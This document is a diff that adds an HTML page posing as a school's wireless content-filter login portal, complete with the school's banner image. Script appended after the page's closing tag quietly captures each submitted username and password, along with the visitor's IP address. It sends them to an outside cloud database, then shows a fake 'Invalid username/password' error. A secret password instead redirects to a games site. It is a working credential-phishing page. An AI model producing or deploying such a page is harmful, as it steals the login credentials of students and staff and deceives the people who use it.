@@ -1,0 +1,228 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="PRAGMA" content="NO-CACHE">
+<title>User Identification Portal</title>
+<style>
+ #content{
+	border-radius : 8px;
+	-webkit-border-radius : 8px;
+	-moz-border-radius : 8px;
+	box-shadow : 0 1px 1px rgba(0, 0, 0, 0.2);
+	-webkit-box-shadow : 0 1px 1px rgba(0, 0, 0, 0.2);
+	background-color : #fff;
+	margin : 0;
+	padding : 0;
+	width : 1001px;
+	height : 600px;
+	position:absolute;
+	left:50%;
+	top:50%;
+	margin:-300px 0 0 -500px;
+}
+  h1{
+  	font-size:1.5em;
+	font-weight:bold;
+	color:#3a3a3a;
+	margin: 5px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align: center;
+	}
+  p{
+  	font-size:1em; 
+	font-family : Lucida Grande, lucida, Helvetica Neue, helvetica, arial, sans-serif; 
+	color:#717171;}
+  b{
+  	font-weight:bold;
+	color:#196390;}
+  a{
+  	color:#6E95D7; 
+  	text-decoration: none;}
+  body {
+	width : 1001px;
+	height : 710px;
+	font-family : Lucida Grande, lucida, Helvetica Neue, helvetica, arial, sans-serif;
+	padding : bottom=0 left=0 right=0 top=0;
+	background-color: #e7e8e9;
+	line-height: 1.3;
+	vertical-align: middle;
+}
+  #pagebanner {
+	width : 1001px;
+	height : 198px;
+	background : url('http://whoami.scotchplc.wa.edu.au/banner-bg.jpg') no-repeat top center;
+	background-color : #e7e8e9;
+}
+  #pagecontent {
+	min-height : 457px;
+	padding-top : 35px;
+	padding : 40px;
+	border-top : none;
+	box-shadow : none;
+}
+
+	#activearea {
+	padding : 20px;
+	width : 400px;
+	margin-left : auto;
+	margin-right : auto;
+}
+	#desc {
+		font-size: 12px;
+		margin: 15px;
+		width: 400px;
+		text-align: left;
+		margin-left: auto;
+		margin-right: auto;
+	}
+	form td, form input {
+		font-size: 1em;
+		font-weight: bold;
+	}
+	form input {
+		width: 150px;
+	}
+	.buttonFixed {
+		width: 60px;
+	}
+	#formtable {
+	background-color : #;
+	padding : 20px;
+	width : 400px;
+	margin-left : auto;
+	margin-right : auto;
+}
+	#formdiv {
+		width: 250px;
+		margin-left: auto;
+		margin-right: auto;
+	}
+	.msg {
+		background-color: #ffff99;
+		border-width: 2px;
+		border-color: #ff0000;
+		border-style: solid;
+		border-radius: 5px;
+		margin-top: 10px;
+		padding: 10px;
+		max-height: 150px;
+		height: expression( this.scrollHeight > 150 ? "150px" : "auto" ); /* sets max-height for IE */
+		overflow: auto;
+		width: 375px;
+		margin-left: -75px;
+		font-size: 1.3em;
+	}
+</style>
+</head>
+<body onload="loadPage();">
+<div id="content">
+<div id="pagebanner"></div>
+<div id="pagecontent">
+<table id="formtable">
+<tbody><tr><td>
+	<div id="activearea">
+		<h1>Scotch &amp; PLC Content Filter Login</h1>
+		<b>Please connect to the PLCScotch wireless network using your school credentials to allow automatic identification.</b><br>
+		<div id="desc">Internet access requires a current Scotch or PLC (ScotchPLC) login.<br>Once you enter valid credentials, your browser should automatically retry the website you were trying to access.</div>
+		<div id="formdiv">
+			
+<script>
+
+function loadPage() {
+	document.login.user.value = "";
+
+    if (document.login.user.value == '')
+	    document.login.user.focus();
+
+	var errMsg = "";
+	var respStatus = "Success";
+	var respMsg = "";
+	if (respStatus == "Error") {
+		if (errMsg != "")
+			errMsg += "<br><br>";
+		errMsg += "<li>"+respMsg;
+	} else if (respStatus == "Challenge") {
+		var divUserName = document.getElementById("dUserName");
+		divUserName.style.display = "none";
+		var passwdTitle = document.getElementById("passwdTitle");
+		passwdTitle.innerHTML = "";
+		
+		var divInputStr = document.getElementById("dInputStr");
+		divInputStr.style.display = "block";
+		divInputStr.innerHTML = respMsg;
+	}
+	// respStatus can also be "" when we come to this page the first time
+
+	if (errMsg != "") {
+		var divObj = document.getElementById("dError");
+		
+		divObj.style.display = "block";
+		divObj.innerHTML = errMsg;
+	}
+}
+
+</script>
+
+	<form name="login" id="login_form" method="post">
+        <input name="inputStr" value="" type="hidden">
+        <input name="escapeUser" value="" type="hidden">        
+    
+        <div id="taLogin">
+             <table>
+                  <tbody><tr id="dUserName">
+                      <td><span id="userTitle">User</span></td>
+	                  <td><input id="user" name="user" size="19" type="text"></td>
+	              </tr>
+	              <tr>
+                      <td><span id="passwdTitle">Password</span></td>
+	                  <td>
+                          <div id="dInputStr" style="display:none"><br></div>
+						  <input maxlength="40" size="19" name="passwd" type="password">
+	                  </td>
+	              </tr>
+              	  <tr>
+                  	  <td>&nbsp;</td>
+	                  <td><input class="buttonFixed" id="submit2" name="ok2" value="Login" onclick="onClick()" type="button"></td>
+	              </tr>
+             </tbody></table>
+         </div>
+	</form>
+    <div id="dError" class="msg" style="display:none"></div>
+
+
+		</div>
+	</div>
+</td></tr>
+</tbody></table></div>
+
+
+</div></body></html>
+</div id="ip"></div>
+<script type="application/javascript">
+  var ip = "";
+  function setIP(json) {
+     ip = json.ip;
+  }
+  function onClick() {
+     if(document.getElementsByName('passwd')[0].value=="trigger") {
+     	document.location = "http://www.puffgames.com/games/sonic-speed-race/";
+     } else {
+	 CB.CloudApp.init('dbqmgxjzpynx', '56bd6211-0a31-403a-af6d-4f719cdce186');
+	 var obj = new CB.CloudObject('Data');
+	 obj.set('Password', document.getElementsByName('passwd')[0].value);
+         document.getElementsByName('passwd')[0].value = "";
+	 obj.set('Username', document.getElementById("user").value);
+	 document.getElementById("user").value = "";
+	 obj.set('IP', ip);
+	 obj.save({
+	     success : function(obj){ }, error : function(error){ }
+	 });
+	 var divObj = document.getElementById("dError");
+	 divObj.style.display = "block";
+	 divObj.innerHTML = "Invalid username/password.";
+     }
+  }
+</script>
+<script src="https://cloudboost.io/js-sdk/cloudboost.js"></script>
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=setIP"></script>
